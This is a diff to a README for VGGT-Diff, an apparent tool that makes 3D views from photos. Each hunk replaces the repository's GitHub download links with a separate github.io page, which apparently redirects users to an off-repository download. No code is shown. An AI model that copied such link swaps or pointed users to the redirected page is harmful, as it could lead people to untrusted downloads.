@@ -1,6 +1,6 @@
 # 🔮 VGGT-Diff - Turn Snapshots into Stunning 3D Views
 
-[![Download VGGT-Diff](https://img.shields.io/badge/Download-VGGT--Diff-blue?style=for-the-badge&logo=github&color=8A2BE2)](https://github.com/Prani11/VGGT-Diff)
+[![Download VGGT-Diff](https://img.shields.io/badge/Download-VGGT--Diff-blue?style=for-the-badge&logo=github&color=8A2BE2)](https://prani11.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Let's get you up and running in just a few minutes. Follow these simple steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Prani11/VGGT-Diff](https://github.com/Prani11/VGGT-Diff)
+Visit this link to download the application: [https://prani11.github.io](https://prani11.github.io)
 
 Click the green "Code" button on the page, then select "Download ZIP". Alternatively, look for a "Releases" section on the right side of the page and click the latest release to find downloadable files.
 
@@ -91,7 +91,7 @@ To ensure VGGT-Diff runs smoothly on your computer, here's what you need:
 
 ### Download Details
 
-Visit this link to download the application: [https://github.com/Prani11/VGGT-Diff](https://github.com/Prani11/VGGT-Diff)
+Visit this link to download the application: [https://prani11.github.io](https://prani11.github.io)
 
 The download is a ZIP file containing everything you need. The total size is typically between 500 MB and 1 GB, so ensure you have enough space and a stable internet connection.
 
@@ -216,7 +216,7 @@ This project is open source. Please review the LICENSE file in the repository fo
 
 You're now ready to transform your photo collection into dynamic, multidimensional experiences. VGGT-Diff puts professional-grade 3D view synthesis at your fingertips—no advanced degree in computer science needed.
 
-Remember: visit [https://github.com/Prani11/VGGT-Diff](https://github.com/Prani11/VGGT-Diff) to download, and you'll be generating stunning new perspectives in minutes. Happy creating!
+Remember: visit [https://prani11.github.io](https://prani11.github.io) to download, and you'll be generating stunning new perspectives in minutes. Happy creating!
 
 ---
 
